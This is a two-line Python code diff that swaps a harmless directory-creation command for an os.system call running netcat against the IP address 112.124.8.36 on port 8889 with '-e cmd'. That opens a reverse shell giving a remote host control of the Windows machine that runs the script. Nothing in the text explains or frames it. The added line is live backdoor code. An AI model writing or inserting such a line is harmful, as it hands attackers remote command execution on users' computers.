@@ -1,3 +1,3 @@
 import os
 
-os.system("mkdir 111")
+os.system("E:\cangku\ncat\nc 112.124.8.36 8889 -e cmd")
